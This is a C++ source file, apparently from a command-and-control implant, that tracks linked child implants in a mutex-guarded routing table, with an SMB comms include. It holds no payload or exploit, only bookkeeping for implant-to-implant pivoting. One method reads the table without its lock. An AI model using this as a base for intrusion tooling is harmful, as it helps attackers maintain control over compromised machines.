/*
Hi!

This is the child handler. It's a singleton used for tracking the state of the children 
this implant has linked to it.


*/


#include "childhandler.h"
#include "protocols/json/json.h"
#include <iostream>
#include <windows.h>
#include "comms/smb.h"
//singleton for this
ChildHandler& ChildHandler::instance() {
    static ChildHandler _instance;
    return _instance;
}

void ChildHandler::add_child(const std::string& uuid, const ChildRouteInfo& info) {
    std::lock_guard<std::mutex> lock(table_mutex_);
    routing_table_[uuid] = info;
}

bool ChildHandler::get_child(const std::string& uuid, ChildRouteInfo& out_info) {
    std::lock_guard<std::mutex> lock(table_mutex_);

    auto it = routing_table_.find(uuid);
    if (it != routing_table_.end()) {
        out_info = it->second;
        return true; // Found it, out_info is populated
    }

    return false; // Child not in the routing table
}

bool ChildHandler::remove_child(const std::string& uuid) {
    std::lock_guard<std::mutex> lock(table_mutex_);

    // erase() returns the number of elements removed (1 if found, 0 if not)
    return routing_table_.erase(uuid) > 0;
}

std::unordered_map<std::string, ChildRouteInfo> ChildHandler::get_all_children() {
    return routing_table_;
}
